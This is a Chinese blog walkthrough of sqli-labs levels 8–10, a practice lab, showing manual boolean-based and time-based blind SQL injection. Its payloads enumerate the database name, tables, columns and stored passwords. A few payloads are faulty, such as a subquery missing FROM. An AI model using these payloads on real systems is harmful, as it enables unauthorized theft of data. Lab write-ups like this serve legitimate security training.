# 原创
：  (手工)【sqli-labs8-10】盲注：布尔盲注、时间盲注

# (手工)【sqli-labs8-10】盲注：布尔盲注、时间盲注

**目录**

[ 推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、读写注入（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less8（GET - Blind - Boolian Based - Single Quotes）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（盲注-布尔-单引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#3.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9)

[2.3、第二步：猜数据库名长度](#3.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6)

[ 2.4、第三步：猜数据库名（ASCII码）](#3.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%88ASCII%E7%A0%81%EF%BC%89)

[2.5、第四步：猜表名](#3.6%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%8C%9C%E8%A1%A8%E5%90%8D)

[2.6、第五步：猜字段名](#3.7%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%90%8D)

[ 2.7、第六步：猜数据](#3.8%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE)

[三、Less9（GET - Blind - Time Based - Single Quotes）](#%E4%B8%89%E3%80%81Less9%EF%BC%88GET%20-%20Blind%20-%20Time%20Based%20-%20Single%20Quotes%EF%BC%89)

[3.1、简介：（盲注-时间-单引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[3.2、第一步：注入点测试](#3.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9)

[3.3、第二步：猜数据库名长度](#3.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6)

[ 3.4、第三步：猜数据库名（ASCII码）](#3.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%88ASCII%E7%A0%81%EF%BC%89)

[3.5、第四步：猜表名长度](#3.5%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%8C%9C%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6)

[3.6、第五步：猜表名](#3.6%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%8C%9C%E8%A1%A8%E5%90%8D)

[ 3.7、第六步：猜字段长度](#%C2%A03.7%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%8C%9C%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6)

[3.8、第七步：猜字段名](#3.7%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%90%8D)

[ 3.9、第八步：猜数据](#3.8%E3%80%81%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E7%8C%9C%E6%95%B0%E6%8D%AE)

[四、Less10（GET - Blind - Time Based - double Quotes）](#%E5%9B%9B%E3%80%81Less10%EF%BC%88GET%20-%20Blind%20-%20Time%20Based%20-%20double%20Quotes%EF%BC%89)

[4.1、简介：（盲注-时间-双引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

---


> 
<h2> 推荐：</h2>
[【SQL注入-无回显】布尔盲注：原理、函数、利用过程<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.4/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M5H6"/>https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165708830116782425195875%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165708830116782425195875&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165708830116782425195875%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165708830116782425195875&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)
[【SQL注入-无回显】时间盲注：原理、函数、利用过程<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.4/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M5H6"/>https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165708830116782425195875%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165708830116782425195875&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165708830116782425195875%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165708830116782425195875&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-125096394-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E7%9B%B2%E6%B3%A8&amp;spm=1018.2226.3001.4450)


---


---


## 一、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：猜数据库名长度
第三步：猜数据库名（ASCII）
第四步：猜表名长
第五步：猜表名
第六步：猜字段名长
第七步：猜字段名
第八步：猜数据长
第九步：猜数据


---


---


## 二、Less8（GET - Blind - Boolian Based - Single Quotes）

> 
<h3>2.1、简介：（盲注-布尔-单引号）</h3>
请求方法：GET
方法：无回显的布尔盲注


> 
<h3>2.2、第一步：注入点测试</h3>
 加上单引号，无返回数据
且注释后，有返回数据
所以为单引号闭合，存在SQL注入点
<img alt="" height="799" src="https://img-blog.csdnimg.cn/873441d2b1024388be3a12969e6bef88.png" width="1200"/> <img alt="" height="778" src="https://img-blog.csdnimg.cn/fc4081037b2e4a1094d1aec88eecc9e2.png" width="1200"/>

?id=1' and 1=1 --+  页面有返回<img alt="" height="796" src="https://img-blog.csdnimg.cn/d6d9e3d5b0ac4a15adb48bb883431c20.png" width="1200"/>
?id=1' and 1=0 --+ 页面无结果返回

存在SQL盲注


> 
<h3>2.3、第二步：猜数据库名长度</h3>
?id=1' and (length(database()))&gt;7--+页面返回有数据

?id=1' and (length(database()))&gt;8--+页面无结果返回

 当前数据库名称长度为：8


> 
<h3> 2.4、第三步：猜数据库名（ASCII码）</h3>
?id=1' and ascii(substr(database(),1,1))&gt;100--+ 页面返回有数据


?id=1' and ascii(substr(database(),1,1))&lt;150--+ 页面返回有数据

 二分法，一直从中间分下去，直到确定一个值对应的ascii码
通过这个方法判断出整个数据库名


> 
<h3>2.5、第四步：猜表名</h3>
?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+页面返回有数据

 ?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150--+有返回数据

 采用二分法以此类推得到唯一的值
通过这个方法判断出整个表名


> 
<h3>2.6、第五步：猜字段名</h3>
?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)))&gt;50--+   页面返回有数据

?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)))&lt;80--+返回有数据

 采用二分法以此类推得到唯一的值
通过这个方法判断出整个字段名


> 
<h3> 2.7、第六步：猜数据</h3>
?id=1' and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+  页面返回有数据


?id=1' and (ascii(substr(( select  id users limit 0,1),1,1)))&gt;30--+页面返回有数据

 采用二分法以此类推得到唯一的值
通过这个方法判断出整个字段名


---


---


## 三、Less9（GET - Blind - Time Based - Single Quotes）

> 
<h3>3.1、简介：（盲注-时间-单引号）</h3>
请求方法：GET
方法：无回显的时间盲注


> 
<h3>3.2、第一步：注入点测试</h3>
 加上单引号、双引号闭合、数值型注入，都发现回显正常
无法判断是否存在注入点

 只能考虑使用延时函数了
 ?id=1' and sleep(5) --+
标签上面在转，说明函数执行了
即存在注入点




> 
<h3>3.3、第二步：猜数据库名长度</h3>
?id=1' and if(length(database())&gt;7,sleep(5),1)--+
转了5s说明判断正确
最后用=确定唯一长度


?id=1' and (length(database()))=8--+
转5s，判断正确，长度为8




> 
<h3> 3.4、第三步：猜数据库名（ASCII码）</h3>
?id=1' and if(ascii(substr(database(),1,1))&lt;200,sleep(5),0) --+
转了5s说明if语句为真




?id=1' and if(ascii(substr(database(),1,1))&gt;100,sleep(5),0) --+
转了5s说明if判断为真


 二分法，一直从中间分下去，直到确定一个值对应的ascii码
通过这个方法判断出整个数据库名


> 
<h3>3.5、第四步：猜表名长度</h3>
?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;3,sleep(5),1)--+
转了5s说明if判断正确

 ?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;8,sleep(5),1)--+
转了5s说明if判断正确<img alt="" height="944" src="https://img-blog.csdnimg.cn/e739ff09199346cc959c5a5a736e92c0.png" width="1200"/>

 采用二分法以此类推得到唯一的值
通过这个方法判断出表长


> 
<h3>3.6、第五步：猜表名</h3>
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;60,  sleep(5),1)--+
转了5s说明if判断正确


?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&lt;200,  sleep(5),1)--+
转了5s说明if判断正确


 采用二分法以此类推得到唯一的值
通过这个方法判断出整个表名


> 
<h3> 3.7、第六步：猜字段长度</h3>
?id=1' and if(length((select column_name from information_schema.columns where table_name='users' limit 0,1))&gt;3,sleep(5),1)--+
转了5s说明if判断正确

 ?id=1' and if(length((select column_name from information_schema.columns where table_name='users' limit 0,1))&lt;10,sleep(5),1)--+
转了5s说明if判断正确

 采用二分法以此类推得到唯一的值
通过这个方法判断出表长


> 
<h3>3.8、第七步：猜字段名</h3>
?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))&gt;10,sleep(5),1)--+
转了5s说明if判断正确


?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))&lt;100,sleep(5),1)--+
转了5s说明if判断正确


 采用二分法以此类推得到唯一的值
通过这个方法判断出整个字段名


> 
<h3> 3.9、第八步：猜数据</h3>
?id=1' and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;10, sleep(5),0)--+
转了5s说明if判断正确



?id=1' and if(ascii(substr((select password from security.users limit 0,1),1,1))&lt;100, sleep(5),0)--+
转了5s说明if判断正确


采用二分法以此类推得到唯一的值
通过这个方法判断出整个数据


---


---


## 四、Less10（GET - Blind - Time Based - double Quotes）

> 
<h3>4.1、简介：（盲注-时间-双引号）</h3>
请求方法：GET
方法：无回显的时间盲注


> 
和Less9基本一样
就是是双引号闭合

